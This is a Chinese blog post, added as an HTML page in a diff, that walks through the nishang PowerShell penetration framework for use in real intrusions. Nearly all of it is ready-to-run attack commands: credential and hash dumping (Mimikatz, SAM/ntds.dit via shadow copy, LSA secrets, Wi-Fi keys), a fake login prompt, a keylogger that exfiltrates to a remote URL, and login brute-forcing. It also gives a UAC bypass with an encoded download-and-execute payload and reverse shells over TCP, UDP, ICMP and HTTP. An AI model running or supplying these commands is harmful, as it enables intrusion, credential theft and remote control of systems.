@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="powershell 渗透框架[ nishang ]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>powershell 渗透框架[ nishang ] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2016/10/05/nishang/">
+                powershell 渗透框架[ nishang ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-10-05</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/powershell/">powershell</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br><br>0x01 前言<br>&nbsp;&nbsp;&nbsp;&nbsp;注意,powershell只能针对win7以后的系统使用,此之前的win系统是没有引入powershell的,powershell是什么这里就不废话了,大家请自行谷歌,在使用各种powrshell脚本过程中,系统权限自然也是越高越好,权限越大你能在系统中操作的范围就越广,至于为什么要选择powershell,想必大家早已心知肚明,免杀,可直接跟系统api交互,容易定制,轻量,远程加载执行,对目标系统的影响极小……好处众多,这里就不多啰嗦了,说破天,我们最终的目的还是希望能在实际渗透中把它用起来,不然,实际价值何在呢</p>
+<p>0x02 关于nishang<br>&nbsp;&nbsp;&nbsp;&nbsp;今天我们就先来看看第一款powershell渗透框架<code>其实,个人觉得把它称为powershell渗透框架似乎更合适些</code>,<code>nishang</code> [想必现在早已家喻户晓],关于nishang中的各个ps脚本的选项用法,在其脚本代码的最前面都有详细说明,使用前请务必仔细阅读,因为系统默认是禁止执行ps脚本的,所以实际用的时候后面都会带上bypass选项<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Set-ExecutionPolicy Unrestricted  如果你得到的是一个交互式的ps shell,也可以用该命令来放开脚本执行限制</div><div class="line"><span class="comment"># powershell –exec bypass –Command "Get-Host | Select-Object Version"  查看当前powershell版本,有些脚本只能在指定的powershell版本中执行</span></div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>0x03 首先,所有内网渗透的第一步,信息搜集[Gather]</p>
+<p>检查当前机器是否为虚拟机:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Check-VM.ps1';Check-VM&#125;"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps vmcheck.jpg" alt=""></p>
+<p>搜集当前机器的各种敏感信息,包括如下<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">当前系统中所登陆过的用户</div><div class="line">putty连接过的内网的linux机器,保存的ssh会话以及最近使用过的命令</div><div class="line">当前机器所开启的共享</div><div class="line">系统环境变量配置</div><div class="line">系统平台及操作系统位数</div><div class="line">当前系统的用户及组信息</div><div class="line">识别snmp默认团体字符串</div><div class="line">系统中所安装的软件</div><div class="line">机器所处的域</div><div class="line">hosts文件内容,一般这个可用来发现内网中的其它机器</div><div class="line">正在运行的服务</div><div class="line">本机的账号密码策略</div><div class="line">无线网卡信息</div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Get-Information.ps1';Get-Information | Out-File info.txt&#125;"</span></div></pre></td></tr></table></figure>
+<p><img src="/img/ps machine_info.jpg" alt=""></p>
+<p>利用卷影拷贝服务[<code>Volume Shadow Copy Service</code>]转储本地的sam文件,如果是在域控上操作,它则会把ntds.dit和system.hiv一并导出来,如下图,ntds.dit文件默认位置是C:\Windows\system32\ntds.dit,如果ntds.dit不是在默认路径下,则要用-ntdsSource选项指明ntds.dit的位置,注意转储到的目录一定要能写,如果是域内用户比较少还好,用户量比较大的情况还是最好不要这种方式来导,之后从文件中把用户hash提取出来即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">这里我直接让它放到C盘根下,实际中你可以指定你自己想存放的位置</div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Copy-VSS.ps1';Copy-VSS -DestinationDir c:\&#125;"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps copy vsso.png" alt=""></p>
+<p>扫描同内网中指定机器所开放的端口,它会根据你所给的端口一个个的遍历,速度可能会有点儿慢[似乎有点儿在逐个 telnet 的感觉]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\FireBuster.ps1';FireBuster 192.168.3.13 20-110 -Verbose&#125;"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps firebuster.jpg" alt=""></p>
+<p>做出口测试用的,说实话,我真没想到它的具体利用场景<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">C:</span>\&gt;powershell -exec bypass</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Gather\FireListener.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; FireListener -portrange <span class="number">80</span>-<span class="number">83</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/FireListener.png" alt=""></p>
+<p>从HKLM中提取lsa证书秘钥,<code>说白点儿就是里面存了各种账号密码</code>,注意可能需要system权限且powershell要在32位模式下运行,实际测试测试中,貌似光有管理权限还不够[没成功],不过类似的功能我们在实际渗透中我们完全可以用别的工具替代不用在这儿太过纠结:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Get-LSASecret.ps1';Enable-DuplicateToken;Get-LSASecret&#125;"</span></div></pre></td></tr></table></figure></p>
+<p>抓取本地用户的密码hash,注意权限务必要够,另外,记得要把你的cmd调宽一点,不然可能看不到完整结果,不过hash貌似又不对:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Get-PassHashes.ps1';Get-PassHashes -PSObjectFormat | Out-File hash.txt&#125;"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps gethashes.jpg" alt=""></p>
+<p>获取本地用户的密码提示:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Get-PassHints.ps1';Get-PassHints&#125;"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps getpashhhints.jpg" alt=""></p>
+<p>从windows Vault[其实就是各类证书管理器,具体作用请自行谷歌]中获取各种web密码,该脚本要求在powershell 3.0(也就是win8以后的系统)以上执行,还是那句话,权限必须要够,比较遗憾,本地实际测试中并未成功读出来:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Get-WebCredentials.ps1';Get-WebCredentials&#125;"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps webcredentials.jpg" alt=""></p>
+<p>抓取当前机器的无线密码 <code>前提是当前系统中要有正在使用的无线网卡才行,不过,这种方式对个人机来说还是挺有用价值的</code>:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Get-WLAN-Keys.ps1';Get-WLAN-Keys&#125;"</span></div></pre></td></tr></table></figure></p>
+<p>简单的一些钓鱼模块,脚本执行以后它会一直弹出输入框,直到用户输入了正确的系统账号密码它才会自动退出,最后会把刚刚用户输入的账号密码显示出来,当然啦,你一样可以把它直接存到文件中,为了给大家看的更直观些,就直接把它打印出来了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Invoke-CredentialsPhish.ps1';Invoke-CredentialsPhish&#125;"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps credentialsphish.jpg" alt=""></p>
+<p>powershell版的mimiktaz,关于mimikatz的用法,相必大家都早已非常熟练,这里就不废话了:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1  2012加上这个还是有点儿问题</span></div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Invoke-Mimikatz.ps1';Invoke-Mimikatz&#125;" 尝试直接抓取当前系统用户的明文密码</span></div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Invoke-Mimikatz.ps1';Invoke-Mimikatz -Command 'privilege::debug sekurlsa::wdigest exit'&#125;" 执行自定义mimikatz内置指令</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps mimikatz.jpg" alt=""></p>
+<p>强制登出系统中当前正处于登陆状态的用户,然后截获其再次登陆时的明文密码,有点儿劫持winlogon.exe进程的意思,但实际中多次折腾都并未成功,如果有谁成功了,麻烦也告诉本人一声,好知道到底是哪里出了问题,我比较懒,抽空容我再看看代码:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Invoke-MimikatzWDigestDowngrade.ps1';Invoke-MimikatzWDigestDowngrade&#125;" 强制锁定系统,然后强迫用户重新登陆</span></div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Invoke-MimikatzWDigestDowngrade.ps1';Get-Job | Receive-Job&#125;" </span></div><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Invoke-MimikatzWDigestDowngrade.ps1';Invoke-MimikatzWDigestDowngrade -RDP&#125;"</span></div></pre></td></tr></table></figure></p>
+<p>利用ReadProcessMemory()函数从内存中提取敏感数据,主要用来抓取内存中的各种网站登陆密码,实际测试过程中有时会卡死,拖慢系统,最重要的是,并没有抓到什么有价值的东西:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Invoke-Mimikittenz.ps1';Invoke-mimikittenz&#125;"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps Mimikittenz.jpg" alt=""></p>
+<p>利用无线的ssid提取用户凭据,看作者介绍似乎非常实用[可能境外特殊的环境所致吧],原理暂时还没弄太明白,正在仔细学习中,后续会把模块单独拿出来说明<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Gather\Invoke-SSIDExfil.ps1';Invoke-SSIDExfil&#125;"</span></div></pre></td></tr></table></figure></p>
+<p>键盘记录,实际测试中还有些问题,正在看……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">PS <span class="symbol">C:</span>\nishang\Gather&gt; .\Keylogger.ps1 -CheckURL <span class="symbol">http:</span>/<span class="regexp">/http:/</span><span class="regexp">/192.168.3.23/drupal</span>-<span class="number">7.54</span> -MagicString pass 检查所给的网页中是否包含自己所给的关键字[admin],如果有就停止记录,记录会被保存在当前用户的temp目录下的key.log文件中, </div><div class="line">PS &gt; .\Keylogger.ps1 -CheckURL <span class="symbol">http:</span>/<span class="regexp">/http:/</span><span class="regexp">/192.168.3.23/drupal</span>-<span class="number">7.54</span> -MagicString pass -exfil -ExfilOption WebServer -URL <span class="symbol">http:</span>/<span class="regexp">/192.168.3.251/res</span>.php  直接把记录结果发到远程服务器,用POST接收下即可</div><div class="line">PS &gt; .\Keylogger.ps1 -persist 持续记录</div><div class="line">PS <span class="symbol">C:</span>\nishang\Gather&gt;  Parse_Keys .\key.log .\plains.txt  就可以还原记录内容了</div></pre></td></tr></table></figure></p>
+<p>0x04 内网端口扫描及服务爆破[scan][目前只支持mssql,ftp,web,activedirectory爆破]</p>
+<p>首先,来看端口扫描,可以直接把要扫的端口都事先写在代码里面,不用非要手工指定,麻烦,又显示不全[还是记得把cmd调宽一些然后存到文件中会好点],实际中也并不建议一下子扫很多,比如你想找sa,只需要指定1433即可,搞定了以后把hash抓一下,也许这事儿就成了,没必要一直扫,还容易触发报警<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Scan\Invoke-PortScan.ps1';Invoke-PortScan -StartAddress 192.168.3.1 -EndAddress 192.168.3.150 -ScanPort -port 21,22,443,445,3306,3389,1433&#125;"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps portscan.jpg" alt=""></p>
+<p>服务爆破,目前貌似只支持mssql,ftp,域[ActiveDirectory]和web<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Scan\Invoke-BruteForce.ps1';Invoke-BruteForce -ComputerName 2008R2DC -UserList C:\user.txt -PasswordList C:\pass.txt -Service SQL -Verbose&#125;"  爆破mssql的sa</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps bruteforce.jpg" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Scan\Invoke-BruteForce.ps1';Invoke-BruteForce -ComputerName 2008R2DC -UserList C:\user.txt -PasswordList C:\pass.txt -Service FTP -Verbose&#125;"  爆破ftp</span></div></pre></td></tr></table></figure>
+<p><img src="/img/ps bruteforce ftp.jpg" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Scan\Invoke-BruteForce.ps1';Invoke-BruteForce -ComputerName 2008R2DC -UserList C:\user.txt -PasswordList C:\pass.txt -Service ActiveDirectory -Verbose&#125;"  爆破域内指定账户密码</span></div></pre></td></tr></table></figure>
+<p><img src="/img/ps bruteforce dc.jpg" alt=""></p>
+<p>0x05 提权相关[Escalation]<br>窃取令牌<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Escalation\Enable-DuplicateToken.ps1';Enable-DuplicateToken&#125;"</span></div></pre></td></tr></table></figure></p>
+<p>尝试bypassUAC,并弹回一个高权限的meterpreter的shell[dll可自定义],可指定不同的bypass方法,更多方法请自行参考脚本说明,这里的payload我是直接用msf生成的,为了避免单双引号的问题,记得把它编码下,实际测试中貌似并没有成功,是我编码的问题吗<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Escalation\Invoke-PsUACme.ps1';Invoke-PsUACme -method oobe -Payload 'powershell -windowstyle hidden -e cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJAB3AD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAHcALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJAB3AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAkAHcALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADMALgA2ADoAOAAwADgAMAAvAGMAaAAxAFEAVgBEAGUAWAAnACkAOwAKAA=='&#125;"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps psuacme.jpg" alt=""></p>
+<p>卸载目标系统中指定的补丁,比如,可以尝试卸载一两个可直接用于提权的补丁,情不得已的情况下,我们也许还可以通过这种方式来快速拿回机器权限<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Escalation\Remove-Update.ps1';Remove-Update KB976902&#125;"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps remove update.jpg" alt=""></p>
+<p>0x06 各种执行系统指令的方式,其实挺实用的,但我自己没成功,确实挺遗憾的[Execution]</p>
+<p>利用powershell以文本的格式下载可执行文件,然后再自动转换成可执行格式并执行,下载者? 测了很多次都没成功,不太明白它的意思是直接提供一个可执行文件还是shellcode?<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Execution\Download_Execute.ps1';Download_Execute http://192.168.3.122/shell.txt&#125;"</span></div></pre></td></tr></table></figure></p>
+<p>下载并执行指定ps脚本<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\nishang\Execution\Download-Execute-PS.ps1';Download-Execute-PS http://192.168.3.122/psshell.ps1  -nodownload&#125;"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps download_exec ps.jpg" alt=""></p>
+<p>利用sa在内网中快速提权种马,这个可能需要交互,连接成功后你可以选择要返回一个什么样的shell,跟sqltools很像[自己用的比较少],基本都是靠这个小脚本,方便,灵活,隐蔽,稳定,小巧,绝逼好用<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">PS <span class="symbol">C:</span>\&gt; Set-ExecutionPolicy Unrestricted</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Execution\Execute-Command-MSSQL.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Execute-Command-MSSQL -ComputerName <span class="number">2012</span>R2DC -UserName sa -Password admin  实际渗透中可以用ip代替机器名</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps mssql connect.jpg" alt=""></p>
+<p>利用dns txt 执行shellcode,有些还不是很通透,正在努力学习中……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Execute-DNSTXT-Code.ps1</div></pre></td></tr></table></figure></p>
+<p>利用rundll32执行各种payload和系统指令以及bypass AppLocker,多次测试均未果,是不是想起了什么呢,没错jsrat呢,嘿嘿……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># nc -lvp 443 -u</span></div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Execution\Out-RundllCommand.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Out-RundllCommand -PayloadURL <span class="symbol">http:</span>/<span class="regexp">/192.168.3.251/</span>Invoke-PowerShellUdp.ps1 -Arguments <span class="string">"Invoke-PowerShellUdp -Reverse -IPAddress 192.168.3.251 -Port 53"</span></div></pre></td></tr></table></figure></p>
+<p>0x07 所支持的一些shell种类,至于是不是真正走的某种协议,自己拿wireshark看下就知道,篇幅原因,我就不扯的太多[Shells]</p>
+<p>通过 regsvr32.exe 弹shell,脚本执行完以后会生成payload代码,然后把该代码拿到目标机器上去执行即可得到一个反向shell,实际测试未通过<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Shells\Invoke-JSRatRegsvr.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-JSRatRegsrv -IPAddress <span class="number">192.168</span>.<span class="number">3.23</span> -Port <span class="number">808</span></div></pre></td></tr></table></figure></p>
+<p>通过 rundll32.exe 弹shell,依然未成功<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Shells\Invoke-JSRatRundll.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-JSRatRundll -IPAddress <span class="number">192.168</span>.<span class="number">3.23</span> -Port <span class="number">808</span></div></pre></td></tr></table></figure></p>
+<p>通过http弹shell,可以看到成功以后它会弹回一个ps的shell<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Shells\Invoke-PoshRatHttp.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-PoshRatHttp -IPAddress <span class="number">192.168</span>.<span class="number">3.23</span> -Port <span class="number">808</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps poshrathttp res.jpg" alt=""></p>
+<p>通过https弹shell,加密shell,看样子数据是接到了,但shell没弹回来<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Shells\Invoke-PoshRatHttps.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-PoshRatHttps -IPAddress <span class="number">192.168</span>.<span class="number">3.23</span> -Port <span class="number">8443</span></div></pre></td></tr></table></figure></p>
+<p>通过icmp弹shell,能ping的情况下可以尝试<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># sysctl -w net.ipv4.icmp_echo_ignore_all=1</span></div><div class="line"><span class="comment"># python icmpsh_m.py 192.168.3.23 192.168.3.1</span></div><div class="line">PS &gt; Invoke-PowerShellIcmp -IPAddress <span class="number">192.168</span>.<span class="number">3.23</span></div></pre></td></tr></table></figure></p>
+<p>普通的tcp shell,有一点点错误,不过无伤大雅<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">本地机器执行:</div><div class="line"><span class="symbol">C:</span>\&gt;nc -lvp <span class="number">1234</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps tcp shell.jpg" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">远程机器执行:</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\nishang\Shells\Invoke-PowerShellTcp.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-PowerShellTcp -Reverse -IPAddress <span class="number">192.168</span>.<span class="number">3.251</span> -Port <span class="number">1234</span></div></pre></td></tr></table></figure>
+<p><img src="/img/ps tcp shell res.jpg" alt=""></p>
+<p>通过udp弹shell,不知为何数据容易塞住<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">本地机器执行:</div><div class="line"><span class="symbol">C:</span>\&gt;nc -lvp <span class="number">53</span> -u</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps udp shell.jpg" alt=""><br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">远程机器执行:</div><div class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Import</span>-<span class="keyword">Module</span> <span class="keyword">C</span>:\nishang\Shells\Invoke-PowerShellUdp.ps1</div><div class="line">PS <span class="keyword">C</span>:\&gt; Invoke-PowerShellUdp -<span class="keyword">Reverse</span> -IPAddress <span class="number">192.168</span><span class="number">.3</span><span class="number">.251</span> -Port <span class="number">53</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ps udp shell res.jpg" alt=""></p>
